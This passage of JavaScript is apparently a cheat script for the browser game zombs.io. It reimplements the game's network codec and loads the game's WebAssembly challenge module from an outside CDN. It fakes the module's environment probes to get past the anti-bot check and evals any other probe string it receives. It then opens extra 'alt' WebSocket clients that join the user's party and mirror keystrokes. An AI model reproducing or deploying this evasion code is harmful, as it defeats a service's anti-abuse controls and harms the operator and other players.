        noAssert = littleEndian;

        littleEndian = encoding;

        encoding = undefined;
    };

    var capacity = 0;

    for (var i = 0, k = buffers.length, length; i < k; ++i) {
        if (!ByteBuffer.isByteBuffer(buffers[i]))
            buffers[i] = ByteBuffer.wrap(buffers[i], encoding);

        length = buffers[i].limit - buffers[i].offset;

        if (length > 0) capacity += length;
    };

    if (capacity === 0)
        return new ByteBuffer(0, littleEndian, noAssert);

    var bb = new ByteBuffer(capacity, littleEndian, noAssert),
        bi;

    i = 0;

    while (i < k) {
        bi = buffers[i++];

        length = bi.limit - bi.offset;
        if (length <= 0) continue;

        bb.view.set(bi.view.subarray(bi.offset, bi.limit), bb.offset);

        bb.offset += length;
    };

    bb.limit = bb.offset;

    bb.offset = 0;

    return bb;
};

ByteBuffer.isByteBuffer = function (bb) {
    return (bb && bb["__isByteBuffer__"]) === true;
};

ByteBuffer.type = function () {
    return ArrayBuffer;
};

ByteBuffer.wrap = function (buffer, encoding, littleEndian, noAssert) {
    if (typeof encoding !== 'string') {
        noAssert = littleEndian;

        littleEndian = encoding;

        encoding = undefined;
    };

    if (typeof buffer === 'string') {
        if (typeof encoding === 'undefined')
            encoding = "utf8";

        switch (encoding) {
            case "base64":
                return ByteBuffer.fromBase64(buffer, littleEndian);

            case "hex":
                return ByteBuffer.fromHex(buffer, littleEndian);

            case "binary":
                return ByteBuffer.fromBinary(buffer, littleEndian);

            case "utf8":
                return ByteBuffer.fromUTF8(buffer, littleEndian);

            case "debug":
                return ByteBuffer.fromDebug(buffer, littleEndian);

            default:
                throw Error("Unsupported encoding: " + encoding);
        };
    };

    if (buffer === null || typeof buffer !== 'object')
        throw TypeError("Illegal buffer");

    var bb;

    if (ByteBuffer.isByteBuffer(buffer)) {
        bb = ByteBufferPrototype.clone.call(buffer);

        bb.markedOffset = -1;

        return bb;
    };

    if (buffer instanceof Uint8Array) {
        bb = new ByteBuffer(0, littleEndian, noAssert);
        if (buffer.length > 0) {
            bb.buffer = buffer.buffer;

            bb.offset = buffer.byteOffset;

            bb.limit = buffer.byteOffset + buffer.byteLength;

            bb.view = new Uint8Array(buffer.buffer);
        };
    } else if (buffer instanceof ArrayBuffer) {
        bb = new ByteBuffer(0, littleEndian, noAssert);

        if (buffer.byteLength > 0) {
            bb.buffer = buffer;

            bb.offset = 0;

            bb.limit = buffer.byteLength;

            bb.view = buffer.byteLength > 0 ? new Uint8Array(buffer) : null;
        };
    } else if (Object.prototype.toString.call(buffer) === "[object Array]") {
        bb = new ByteBuffer(buffer.length, littleEndian, noAssert);

        bb.limit = buffer.length;

        for (var i = 0; i < buffer.length; ++i)
            bb.view[i] = buffer[i];
    } else
        throw TypeError("Illegal buffer");
    return bb;
};

let PacketIds_1 = {
    "default": {
        "0": "PACKET_ENTITY_UPDATE",
        "1": "PACKET_PLAYER_COUNTER_UPDATE",
        "2": "PACKET_SET_WORLD_DIMENSIONS",
        "3": "PACKET_INPUT",
        "4": "PACKET_ENTER_WORLD",
        "5": "PACKET_PRE_ENTER_WORLD",
        "6": "PACKET_ENTER_WORLD2",
        "7": "PACKET_PING",
        "9": "PACKET_RPC",
        "PACKET_PRE_ENTER_WORLD": 5,
        "PACKET_ENTER_WORLD": 4,
        "PACKET_ENTER_WORLD2": 6,
        "PACKET_ENTITY_UPDATE": 0,
        "PACKET_INPUT": 3,
        "PACKET_PING": 7,
        "PACKET_PLAYER_COUNTER_UPDATE": 1,
        "PACKET_RPC": 9,
        "PACKET_SET_WORLD_DIMENSIONS": 2
    }
}

let e_AttributeType = {
    "0": "Uninitialized",
    "1": "Uint32",
    "2": "Int32",
    "3": "Float",
    "4": "String",
    "5": "Vector2",
    "6": "EntityType",
    "7": "ArrayVector2",
    "8": "ArrayUint32",
    "9": "Uint16",
    "10": "Uint8",
    "11": "Int16",
    "12": "Int8",
    "13": "Uint64",
    "14": "Int64",
    "15": "Double",
    "Uninitialized": 0,
    "Uint32": 1,
    "Int32": 2,
    "Float": 3,
    "String": 4,
    "Vector2": 5,
    "EntityType": 6,
    "ArrayVector2": 7,
    "ArrayUint32": 8,
    "Uint16": 9,
    "Uint8": 10,
    "Int16": 11,
    "Int8": 12,
    "Uint64": 13,
    "Int64": 14,
    "Double": 15
};

let e_ParameterType = {
    "0": "Uint32",
    "1": "Int32",
    "2": "Float",
    "3": "String",
    "4": "Uint64",
    "5": "Int64",
    "Uint32": 0,
    "Int32": 1,
    "Float": 2,
    "String": 3,
    "Uint64": 4,
    "Int64": 5
}

class BinCodec {
    constructor() {
        this.attributeMaps = {};

        this.entityTypeNames = {};

        this.rpcMaps = [{
            "name": "message",
            "parameters": [{
                "name": "msg",
                "type": 3
            }],
            "isArray": false,
            "index": 0
        }, {
            "name": "serverObj",
            "parameters": [{
                "name": "data",
                "type": 3
            }],
            "isArray": false,
            "index": 1
        }];

        this.rpcMapsByName = {
            "message": {
                "name": "message",
                "parameters": [{
                    "name": "msg",
                    "type": 3
                }],
                "isArray": false,
                "index": 0
            },
            "serverObj": {
                "name": "serverObj",
                "parameters": [{
                    "name": "data",
                    "type": 3
                }],
                "isArray": false,
                "index": 1
            }
        };

        this.sortedUidsByType = {};

        this.removedEntities = {};

        this.absentEntitiesFlags = [];

        this.updatedEntityFlags = [];

        this.startedDecoding = Date.now();
    };

    encode(name, item, Module) {
        let buffer = new ByteBuffer(100, true);

        switch (name) {
            case PacketIds_1.default.PACKET_ENTER_WORLD:
                buffer.writeUint8(PacketIds_1.default.PACKET_ENTER_WORLD);

                this.encodeEnterWorld(buffer, item);

                break;
            case PacketIds_1.default.PACKET_ENTER_WORLD2:
                buffer.writeUint8(PacketIds_1.default.PACKET_ENTER_WORLD2);

                this.encodeEnterWorld2(buffer, Module);

                break;
            case PacketIds_1.default.PACKET_INPUT:
                buffer.writeUint8(PacketIds_1.default.PACKET_INPUT);

                this.encodeInput(buffer, item);

                break;
            case PacketIds_1.default.PACKET_PING:
                buffer.writeUint8(PacketIds_1.default.PACKET_PING);

                this.encodePing(buffer, item);

                break;
            case PacketIds_1.default.PACKET_RPC:
                buffer.writeUint8(PacketIds_1.default.PACKET_RPC);

                this.encodeRpc(buffer, item);

                break;
        };

        buffer.flip();

        buffer.compact();

        return buffer.toArrayBuffer(false);
    };

    decode(data, Module) {
        let buffer = ByteBuffer.wrap(data);
        buffer.littleEndian = true;

        let opcode = buffer.readUint8();

        let decoded;

        switch (opcode) {
            case PacketIds_1.default.PACKET_PRE_ENTER_WORLD:
                decoded = this.decodePreEnterWorldResponse(buffer, Module);

                break;
            case PacketIds_1.default.PACKET_ENTER_WORLD:
                decoded = this.decodeEnterWorldResponse(buffer);

                break;
            case PacketIds_1.default.PACKET_ENTITY_UPDATE:
                decoded = this.decodeEntityUpdate(buffer);

                break;
            case PacketIds_1.default.PACKET_PING:
                decoded = this.decodePing(buffer);

                break;
            case PacketIds_1.default.PACKET_RPC:
                decoded = this.decodeRpc(buffer);

                break;
        };

        decoded.opcode = opcode;

        return decoded;
    };

    safeReadVString(buffer) {
        let offset = buffer.offset;
        let len = buffer.readVarint32(offset);

        try {
            var func = buffer.readUTF8String.bind(buffer);

            var str = func(len.value, "b", offset += len.length);

            offset += str.length;

            buffer.offset = offset;

            return str.string;
        } catch (e) {
            offset += len.value;

            buffer.offset = offset;

            return '?';
        };
    };

    decodePreEnterWorldResponse(buffer, Module) {
        Module._MakeBlendField(24, 132);

        for (let firstSync = Module._MakeBlendField(228, 132), i = 0; buffer.remaining();)
            Module.HEAPU8[firstSync + i] = buffer.readUint8(), i++;

        Module._MakeBlendField(172, 36);

        for (var secondSync = Module._MakeBlendField(4, 152), extraBuffers = new ArrayBuffer(64), exposedBuffers = new Uint8Array(extraBuffers), i = 0; i < 64; i++) {
            exposedBuffers[i] = Module.HEAPU8[secondSync + i];
        };

        return {
            extra: extraBuffers
        };
    };

    decodeEnterWorldResponse(buffer) {
        let allowed = buffer.readUint32();

        let uid = buffer.readUint32();

        let startingTick = buffer.readUint32();

        let ret = {
            allowed: allowed,
            uid: uid,
            startingTick: startingTick,
            tickRate: buffer.readUint32(),
            effectiveTickRate: buffer.readUint32(),
            players: buffer.readUint32(),
            maxPlayers: buffer.readUint32(),
            chatChannel: buffer.readUint32(),
            effectiveDisplayName: this.safeReadVString(buffer),
            x1: buffer.readInt32(),
            y1: buffer.readInt32(),
            x2: buffer.readInt32(),
            y2: buffer.readInt32()
        };

        let attributeMapCount = buffer.readUint32();

        this.attributeMaps = {};

        this.entityTypeNames = {};

        for (let i = 0; i < attributeMapCount; i++) {
            let attributeMap = [];

            let entityType = buffer.readUint32();

            let entityTypeString = buffer.readVString();

            let attributeCount = buffer.readUint32();

            for (let j = 0; j < attributeCount; j++) {
                let name_1 = buffer.readVString();

                let type = buffer.readUint32();

                attributeMap.push({
                    name: name_1,
                    type: type
                });
            };

            this.attributeMaps[entityType] = attributeMap;

            this.entityTypeNames[entityType] = entityTypeString;

            this.sortedUidsByType[entityType] = [];
        };

        let rpcCount = buffer.readUint32();

        this.rpcMaps = [];

        this.rpcMapsByName = {};

        for (let i = 0; i < rpcCount; i++) {
            let rpcName = buffer.readVString();

            let paramCount = buffer.readUint8();

            let isArray = buffer.readUint8() != 0;

            let parameters = [];

            for (let j = 0; j < paramCount; j++) {
                let paramName = buffer.readVString();

                let paramType = buffer.readUint8();

                parameters.push({
                    name: paramName,
                    type: paramType
                });
            };

            let rpc = {
                name: rpcName,
                parameters: parameters,
                isArray: isArray,
                index: this.rpcMaps.length
            };

            this.rpcMaps.push(rpc);

            this.rpcMapsByName[rpcName] = rpc;
        };

        return ret;
    };

    decodeEntityUpdate(buffer) {
        let tick = buffer.readUint32();

        let removedEntityCount = buffer.readVarint32();

        const entityUpdateData = {};

        entityUpdateData.tick = tick;

        entityUpdateData.entities = new Map();

        let rE = Object.keys(this.removedEntities);

        for (let i = 0; i < rE.length; i++) {
            delete this.removedEntities[rE[i]];
        };

        for (let i = 0; i < removedEntityCount; i++) {
            var uid = buffer.readUint32();

            this.removedEntities[uid] = 1;
        };

        let brandNewEntityTypeCount = buffer.readVarint32();

        for (let i = 0; i < brandNewEntityTypeCount; i++) {
            var brandNewEntityCountForThisType = buffer.readVarint32();

            var brandNewEntityType = buffer.readUint32();

            for (var j = 0; j < brandNewEntityCountForThisType; j++) {
                var brandNewEntityUid = buffer.readUint32();

                this.sortedUidsByType[brandNewEntityType].push(brandNewEntityUid);
            };
        };

        let SUBT = Object.keys(this.sortedUidsByType);

        for (let i = 0; i < SUBT.length; i++) {
            let table = this.sortedUidsByType[SUBT[i]];

            let newEntityTable = [];

            for (let j = 0; j < table.length; j++) {
                let uid = table[j];

                if (!(uid in this.removedEntities)) {
                    newEntityTable.push(uid);
                };
            };

            newEntityTable.sort((a, b) => a - b);

            this.sortedUidsByType[SUBT[i]] = newEntityTable;
        };

        while (buffer.remaining()) {
            let entityType = buffer.readUint32();

            if (!(entityType in this.attributeMaps)) {
                throw new Error('Entity type is not in attribute map: ' + entityType);
            };

            let absentEntitiesFlagsLength = Math.floor((this.sortedUidsByType[entityType].length + 7) / 8);

            this.absentEntitiesFlags.length = 0;

            for (let i = 0; i < absentEntitiesFlagsLength; i++) {
                this.absentEntitiesFlags.push(buffer.readUint8());
            };

            let attributeMap = this.attributeMaps[entityType];

            for (let tableIndex = 0; tableIndex < this.sortedUidsByType[entityType].length; tableIndex++) {
                let uid = this.sortedUidsByType[entityType][tableIndex];

                if ((this.absentEntitiesFlags[Math.floor(tableIndex / 8)] & (1 << (tableIndex % 8))) !== 0) {
                    entityUpdateData.entities.set(uid, true);

                    continue;
                };

                var player = {
                    uid: uid
                };

                this.updatedEntityFlags.length = 0;

                for (let j = 0; j < Math.ceil(attributeMap.length / 8); j++) {
                    this.updatedEntityFlags.push(buffer.readUint8());
                };

                for (let j = 0; j < attributeMap.length; j++) {
                    let attribute = attributeMap[j];

                    let flagIndex = Math.floor(j / 8);

                    let bitIndex = j % 8;

                    let count = void 0;

                    let v = [];

                    if (this.updatedEntityFlags[flagIndex] & (1 << bitIndex)) {
                        switch (attribute.type) {
                            case e_AttributeType.Uint32:
                                player[attribute.name] = buffer.readUint32();

                                break;
                            case e_AttributeType.Int32:
                                player[attribute.name] = buffer.readInt32();
                                break;
                            case e_AttributeType.Float:
                                player[attribute.name] = buffer.readInt32() / 100;

                                break;
                            case e_AttributeType.String:
                                player[attribute.name] = this.safeReadVString(buffer);

                                break;
                            case e_AttributeType.Vector2:
                                var x = buffer.readInt32() / 100;

                                var y = buffer.readInt32() / 100;

                                player[attribute.name] = {
                                    x: x,
                                    y: y
                                };

                                break;
                            case e_AttributeType.ArrayVector2:
                                count = buffer.readInt32();

                                v = [];

                                for (let i = 0; i < count; i++) {
                                    let x_1 = buffer.readInt32() / 100;

                                    let y_1 = buffer.readInt32() / 100;

                                    v.push({
                                        x: x_1,
                                        y: y_1
                                    });
                                };

                                player[attribute.name] = v;

                                break;
                            case e_AttributeType.ArrayUint32:
                                count = buffer.readInt32();

                                v = [];

                                for (let i = 0; i < count; i++) {
                                    let element = buffer.readInt32();

                                    v.push(element);
                                };

                                player[attribute.name] = v;

                                break;
                            case e_AttributeType.Uint16:
                                player[attribute.name] = buffer.readUint16();

                                break;
                            case e_AttributeType.Uint8:
                                player[attribute.name] = buffer.readUint8();

                                break;
                            case e_AttributeType.Int16:
                                player[attribute.name] = buffer.readInt16();

                                break;
                            case e_AttributeType.Int8:
                                player[attribute.name] = buffer.readInt8();

                                break;
                            case e_AttributeType.Uint64:
                                player[attribute.name] = buffer.readUint32() + buffer.readUint32() * 4294967296;

                                break;
                            case e_AttributeType.Int64:
                                var s64 = buffer.readUint32();

                                var s642 = buffer.readInt32();

                                if (s642 < 0) {
                                    s64 *= -1;
                                };

                                s64 += s642 * 4294967296;
                                player[attribute.name] = s64;

                                break;
                            case e_AttributeType.Double:
                                var s64d = buffer.readUint32();

                                var s64d2 = buffer.readInt32();

                                if (s64d2 < 0) {
                                    s64d *= -1;
                                };

                                s64d += s64d2 * 4294967296;

                                s64d = s64d / 100;

                                player[attribute.name] = s64d;

                                break;
                            default:
                                throw new Error('Unsupported attribute type: ' + attribute.type);
                        };
                    };
                };

                entityUpdateData.entities.set(player.uid, player);
            };
        };

        entityUpdateData.byteSize = buffer.capacity();

        return entityUpdateData;
    };

    decodePing() {
        return {};
    };

    encodeRpc(buffer, item) {
        if (!(item.name in this.rpcMapsByName)) {
            throw new Error('RPC not in map: ' + item.name);
        };

        var rpc = this.rpcMapsByName[item.name];

        buffer.writeUint32(rpc.index);

        for (var i = 0; i < rpc.parameters.length; i++) {
            var param = item[rpc.parameters[i].name];

            switch (rpc.parameters[i].type) {
                case e_ParameterType.Float:
                    buffer.writeInt32(Math.floor(param * 100.0));

                    break;
                case e_ParameterType.Int32:
                    buffer.writeInt32(param);

                    break;
                case e_ParameterType.String:
                    buffer.writeVString(param);

                    break;
                case e_ParameterType.Uint32:
                    buffer.writeUint32(param);

                    break;
            };
        };
    };

    decodeRpcObject(buffer, parameters) {
        var result = {};

        for (var i = 0; i < parameters.length; i++) {
            switch (parameters[i].type) {
                case e_ParameterType.Uint32:
                    result[parameters[i].name] = buffer.readUint32();

                    break;
                case e_ParameterType.Int32:
                    result[parameters[i].name] = buffer.readInt32();

                    break;
                case e_ParameterType.Float:
                    result[parameters[i].name] = buffer.readInt32() / 100.0;

                    break;
                case e_ParameterType.String:
                    result[parameters[i].name] = this.safeReadVString(buffer);

                    break;
                case e_ParameterType.Uint64:
                    result[parameters[i].name] = buffer.readUint32() + buffer.readUint32() * 4294967296;

                    break;
            };
        };

        return result;
    };

    decodeRpc(buffer) {
        var rpcIndex = buffer.readUint32();
        var rpc = this.rpcMaps[rpcIndex];

        var result = {
            name: rpc.name,
            response: null
        };

        if (!rpc.isArray) {
            result.response = this.decodeRpcObject(buffer, rpc.parameters);
        } else {
            var response = [];
            var count = buffer.readUint16();

            for (var i = 0; i < count; i++) {
                response.push(this.decodeRpcObject(buffer, rpc.parameters));
            };

            result.response = response;
        };

        return result;
    };

    encodeEnterWorld(buffer, item) {
        buffer.writeVString(item.displayName);

        for (var e = new Uint8Array(item.extra), i = 0; i < item.extra.byteLength; i++)
            buffer.writeUint8(e[i]);
    };

    encodeEnterWorld2(buffer, Module) {
        var managementcommandsdns = Module._MakeBlendField(187, 22);

        for (var siteName = 0; siteName < 16; siteName++) {
            buffer.writeUint8(Module.HEAPU8[managementcommandsdns + siteName]);
        };
    };

    encodeInput(buffer, item) {
        buffer.writeVString(JSON.stringify(item));
    };

    encodePing(buffer) {
        buffer.writeUint8(0);
    };
};

game.script.codec = new BinCodec();

let wasmBytes;
fetch('https://cdn.glitch.global/37382213-67d1-4bce-af19-736adaa6c524/zombs_wasm%20(9).wasm?v=1656255797711').then(buffer => buffer.arrayBuffer().then(bytes => {
    wasmBytes = bytes;
}));
let wasmmodule = (decoder, callback, event) => {
    function tDecoder(buffers, offset, item) {
        var buffer = offset + item;
        var bytes = offset;
        for (; buffers[bytes] && !(bytes >= buffer);) {
            ++bytes;
        };
        if (bytes - offset > 16 && buffers.buffer && textDecoder) {
            return textDecoder.decode(buffers.subarray(offset, bytes));
        };
        var string = '';
        for (; offset < bytes;) {
            let bfr = buffers[offset++];
            if (128 & bfr) {
                var off = 63 & buffers[offset++];
                if (192 != (224 & bfr)) {
                    var str = 63 & buffers[offset++];
                    if (bfr = 224 == (240 & bfr) ? (15 & bfr) << 12 | off << 6 | str : (7 & bfr) << 18 | off << 12 | str << 6 | 63 & buffers[offset++], bfr < 65536) {
                        string = string + String.fromCharCode(bfr);
                    } else {
                        var ost = bfr - 65536;
                        string = string + String.fromCharCode(55296 | ost >> 10, 56320 | 1023 & ost);
                    };
                } else {
                    string = string + String.fromCharCode((31 & bfr) << 6 | off);
                };
            } else {
                string = string + String.fromCharCode(bfr);
            };
        };
        return string;
    };

    function HU8Decoder(name, item) {
        return name ? tDecoder(HEAPU8, name, item) : '';
    };

    function sivb(str, item, value, bytes) {
        if (!(bytes > 0)) {
            return 0;
        };
        var len = value;
        var offset = value + bytes - 1;
        var emptyByte = 0;
        for (; emptyByte < str.length; ++emptyByte) {
            var strByte = str.charCodeAt(emptyByte);
            if (strByte >= 55296 && strByte <= 57343) {
                var strCCByte = str.charCodeAt(++emptyByte);
                strByte = 65536 + ((1023 & strByte) << 10) | 1023 & strCCByte;
            };
            if (strByte <= 127) {
                if (value >= offset) {
                    break;
                };
                item[value++] = strByte;
            } else {
                if (strByte <= 2047) {
                    if (value + 1 >= offset) {
                        break;
                    };
                    item[value++] = 192 | strByte >> 6;
                    item[value++] = 128 | 63 & strByte;
                } else {
                    if (strByte <= 65535) {
                        if (value + 2 >= offset) {
                            break;
                        };
                        item[value++] = 224 | strByte >> 12;
                        item[value++] = 128 | strByte >> 6 & 63;
                        item[value++] = 128 | 63 & strByte;
                    } else {
                        if (value + 3 >= offset) {
                            break;
                        };
                        item[value++] = 240 | strByte >> 18;
                        item[value++] = 128 | strByte >> 12 & 63;
                        item[value++] = 128 | strByte >> 6 & 63;
                        item[value++] = 128 | 63 & strByte;
                    };
                };
            };
        };
        return item[value] = 0, value - len;
    };

    function svb(str, value, bytes) {
        return sivb(str, HEAPU8, value, bytes);
    };

    function cb(str) {
        var j = 0;
        var i = 0;
        for (; i < str.length; ++i) {
            var len = str.charCodeAt(i);
            if (len >= 55296 && len <= 57343) {
                len = 65536 + ((1023 & len) << 10) | 1023 & str.charCodeAt(++i);
            };
            if (len <= 127) {
                ++j;
            } else {
                j = j + (len <= 2047 ? 2 : len <= 65535 ? 3 : 4);
            };
        };
        return j;
    };

    function arrays(buffer) {
        server.HEAP8 = HEAP8 = new Int8Array(33554432);
        server.HEAP16 = HEAP16 = new Int16Array(16777216);
        server.HEAP32 = HEAP32 = new Int32Array(buffer);
        server.HEAPU8 = HEAPU8 = new Uint8Array(buffer);
        server.HEAPU16 = HEAPU16 = new Uint16Array(16777216);
        server.HEAPU32 = HEAPU32 = new Uint32Array(8388608);
        server.HEAPF32 = HEAPF32 = new Float32Array(8388608);
        server.HEAPF64 = HEAPF64 = new Float64Array(4194304);
    };

    function checkWasm() {
        function check(module) {
            server.asm = module.exports;
            arrays(server.asm.g.buffer);
            wcc();
            incH32();
        };

        function amountOfBytes(bytes) {
            check(bytes.instance);
        };

        function wasm(byteCheck) {
            WebAssembly.instantiate(wasmBytes, methods).then(bytes => {
                byteCheck(bytes);
                typeof decoder == 'function' && decoder(server.decodeOpcode5(event, callback));
            });
        };
        var methods = {
            'a': {
                'd': () => { },
                'e': () => { },
                'c': () => { },
                'f': () => { },
                'b': string,
                'a': bufferByte
            }
        };

        if (server.bytes) {
            try {
                return server.bytes(methods, check);
            } catch (err) {
                return console.log('Illegal byte: ' + err), false;
            };
        };

        wasm(amountOfBytes);

        return {};
    };

    function string(str) {
        let string = HU8Decoder(str);
        if (string.includes('typeof window === "undefined" ? 1 : 0;')) {
            return 0;
        };
        if (string.includes('typeof process !== "undefined" ? 1 : 0;')) {
            return 0;
        };
        if (string.includes('Game.currentGame.network.connected ? 1 : 0;')) {
            return 1;
        };
        if (string.includes('Game.currentGame.world.myUid === null ? 0 : Game.currentGame.world.myUid;')) {
            return 0;
        };
        if (string.includes('document.getElementById("hud").children.length;')) {
            return 24;
        };
        if (string.includes('hostname')) {
            return event;
        };
        let stringEval = eval(HU8Decoder(str));
        return 0 | stringEval;
    };

    function bufferByte(str) {
        var i = event;
        if (null == i) return 0;
        i = i + '';
        var buffer = bufferByte;
        var j = cb(i);
        return (!buffer.byte || buffer.byte < j + 1) && (buffer.byte && free(buffer.buffer), buffer.byte = j + 1, buffer.buffer = mlc(buffer.byte)), svb(i, buffer.buffer, buffer.byte), buffer.buffer;
    };

    function incH32() {
        HEAP32[1328256] = 5313008;
        HEAP32[1328257] = 0;
        try {
            server._main(1, 5313024);
        } finally { };
    };
    var server = {};
    var textDecoder = new TextDecoder('utf8');
    var HEAPU8;
    var HEAP32;
    checkWasm();
    var wcc = server.___wasm_call_ctors = function () {
        return (wcc = server.___wasm_call_ctors = server.asm.i).apply(null, arguments);
    };
    var main = server._main = function () {
        return (main = server._main = server.asm.j).apply(null, arguments);
    };
    var mbf = server._MakeBlendField = function () {
        return (mbf = server._MakeBlendField = server.asm.k).apply(null, arguments);
    };
    var mlc = server._malloc = function () {
        return (mlc = server._malloc = server.asm.o).apply(null, arguments);
    };
    var free = server._free = function () {
        return (free = server._free = server.asm.p).apply(null, arguments);
    };
    server.decodeOpcode5 = function (name, offset) {
        server.hostname = name;
        let op5 = game.script.codec.decode(new Uint8Array(offset), server);
        let op6 = game.script.codec.encode(6, {}, server);
        return {
            5: op5,
            6: op6
        };
    };
    return server;
};

let mousemove = false;
let lock = false;
let mousePosition;
let movements = [90, 225, 45, 315, 135, 359, 180, 270];
let yaws = [];
for (let i = 0; i < 360; i++) {
    yaws.push(i);
};
let angleTo = (xFrom, yFrom, xTo, yTo) => {
    var dx = xTo - xFrom;
    var dy = yTo - yFrom;
    var yaw = Math.atan2(dy, dx) * 180.0 / Math.PI;
    var nonZeroYaw = yaw + 180.0;
    var reversedYaw = nonZeroYaw;
    var shiftedYaw = (360.0 + reversedYaw - 90.0) % 360.0;
    return shiftedYaw;
};

let screenToYaw = (x, y) => {
    var angle = Math.round(angleTo(game.renderer.getWidth() / 2, game.renderer.getHeight() / 2, x, y));
    return angle % 360;
};

let movement_1 = {
    movements: [90, 225, 45, 315, 135, 359, 180, 270],
    typeToValue: { "top": 359, "top right": 45, "right": 90, "bottom right": 135, "bottom": 180, "bottom left": 225, "left": 270, "top left": 315 },
    valueToType: { 359: "top", 45: "top right", 90: "right", 135: "bottom right", 180: "bottom", 225: "bottom left", 270: "left", 315: "top left" },
    aimToYaw: (num) => !(num > 90 + 23) && !(num < 90 - 23)
        ? 90 : !(num > 225 + 23) && !(num < 225 - 23)
            ? 225 : !(num > 135 + 23) && !(num < 135 - 23)
                ? 135 : !(num > 360 + 23) && !(num < 360 - 23)
                    ? 359 : !(num > 0 + 23) && !(num < 0 - 23)
                        ? 359 : !(num > 180 + 23) && !(num < 180 - 23)
                            ? 180 : !(num > 270 + 23) && !(num < 270 - 23)
                                ? 270 : !(num > 315 + 23) && !(num < 315 - 23)
                                    ? 315 : !(num > 45 + 23) && !(num < 45 - 23)
                                        ? 45 : null
};

window.allSockets = [];

window.sendws = () => {
    let isOnControl;
    let isTrue = true;
    let altElem = document.createElement('div');

    let server = game.network.connectionOptions ?? game.options.servers[document.getElementsByClassName('hud-intro-server')[0].value];

    let ws = new WebSocket('wss://' + server.hostname + ':' + server.port);

    if (!window.allSockets[window.allSockets.length]) {
        ws.cloneId = window.allSockets.length + 1;
        window.allSockets[window.allSockets.length] = ws;
    };

    ws.binaryType = "arraybuffer";
    ws.aimingYaw = 1;

    ws.onclose = data => {
        ws.isclosed = true;
        altElem.remove();
    }

    ws.onmessage = msg => {
        if (new Uint8Array(msg.data)[0] == 5) {
            ws.network = new game.networkType();
            ws.network.sendPacket = (e, t) => {
                if (!ws.isclosed) {
                    ws.send(new Uint8Array(ws.network.codec.encode(e, t)))
                }
            }
            wasmmodule(wasm => {
                ws.network.sendPacket(4, { displayName: altName, extra: wasm[5].extra });
                ws.EnterWorld2Response = wasm[6]
            }, new Uint8Array(msg.data), server.ipAddress)
            return;
        }

        ws.data = ws.network.codec.decode(msg.data)

        if (isTrue) {
            isTrue = !isTrue;

            if (ws.psk) {
                ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: game.ui.getPlayerPartyShareKey() + "" });

                altElem.classList.add('hud-map-player');
                document.getElementsByClassName('hud-map')[0].appendChild(altElem);
            } else {
                setTimeout(() => {
                    if (ws.psk) {
                        ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: game.ui.getPlayerPartyShareKey() + "" });

                        altElem.classList.add('hud-map-player');
                        document.getElementsByClassName('hud-map')[0].appendChild(altElem);
                    };
                }, 1000)
            };

            var timeCheck = setTimeout(function () {
                if (ws.cloneId === 0) {
                    ws.close();
                }
            }, 3000);

            ws.network.sendPacket(3, { up: 1 });
            ws.mouseUp = 1;
            ws.mouseDown = 0;
            ws.f = false;

            function mouseMoved(e, x, y, d) {
                ws.aimingYaw = e;
                if (ws.mouseDown && !ws.mouseUp) {
                    ws.network.sendPacket(3, { mouseMovedWhileDown: e, worldX: x, worldY: y, distance: d });
                }
                if (!ws.mouseDown && ws.mouseUp) {
                    ws.network.sendPacket(3, { mouseMoved: e, worldX: x, worldY: y, distance: d });
                }
            }

            ws.data.opcode == 0 && (ws.myPlayer.dead == 0) && ws.network.sendPacket(3, {
                up: 1,
                down: 0
            });
            document.addEventListener('keydown', e => {
                if (!ws.isclosed) {
                    if (isOnControl) {
                        if (e.keyCode == 81 && document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
                            var nextWeapon = location.hostname == "zombs.io" ? 'Pickaxe' : "Crossbow";
                            var weaponOrder = location.hostname == "zombs.io" ? ['Pickaxe', 'Spear', 'Bow', 'Bomb'] : ["Crossbow", 'Pickaxe', 'Spear', 'Bow', 'Bomb'];
                            var foundCurrent = false;
                            for (let i in weaponOrder) {
                                if (foundCurrent) {
                                    if (ws.inventory[weaponOrder[i]]) {
                                        nextWeapon = weaponOrder[i];
                                        break;
                                    }
                                } else if (weaponOrder[i] == ws.myPlayer.weaponName) {
                                    foundCurrent = true;
                                }
                            }
                            ws.network.sendPacket(9, { name: 'EquipItem', itemName: nextWeapon, tier: ws.inventory[nextWeapon].tier });
                        }
                        if (e.keyCode == 32 && document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
                            ws.network.sendPacket(3, { space: 0 });
                            ws.network.sendPacket(3, { space: 1 });
                        }
                        let KeyCode = e.keyCode;
                        if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
                            if (!ws.automove && !window.lock) {
                                if (KeyCode == 76) {
                                    ws.network.sendPacket(3, { up: 1, down: 0 });
                                }
                                if (KeyCode == 191) {
                                    ws.network.sendPacket(3, { right: 1, left: 0 });
                                }
                                if (KeyCode == 190) {
                                    ws.network.sendPacket(3, { down: 1, up: 0 });
                                }
                                if (KeyCode == 188) {
                                    ws.network.sendPacket(3, { left: 1, right: 0 });
                                }
                                if (KeyCode == 87) {
                                    ws.network.sendPacket(3, { up: 1, down: 0 });
                                }
                                if (KeyCode == 68) {
                                    ws.network.sendPacket(3, { right: 1, left: 0 });
                                }
                                if (KeyCode == 83) {
                                    ws.network.sendPacket(3, { down: 1, up: 0 });
                                }
                                if (KeyCode == 65) {
                                    ws.network.sendPacket(3, { left: 1, right: 0 });
                                }
                            }
                        }
                    }
                }
            })
            document.addEventListener('keyup', e => {
                if (!ws.isclosed) {
                    if (isOnControl) {
                        let KeyCode = e.keyCode;
                        if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea") {
                            if (!ws.automove && !window.lock) {
                                if (KeyCode == 76) {
                                    ws.network.sendPacket(3, { up: 0 });
                                }
                                if (KeyCode == 191) {
                                    ws.network.sendPacket(3, { right: 0 });
                                }
                                if (KeyCode == 190) {
                                    ws.network.sendPacket(3, { down: 0 });
                                }
                                if (KeyCode == 188) {
                                    ws.network.sendPacket(3, { left: 0 });
                                }
                                if (KeyCode == 87) {
                                    ws.network.sendPacket(3, { up: 0 });
                                }
                                if (KeyCode == 68) {
                                    ws.network.sendPacket(3, { right: 0 });
                                }
                                if (KeyCode == 83) {
                                    ws.network.sendPacket(3, { down: 0 });
                                }
                                if (KeyCode == 65) {
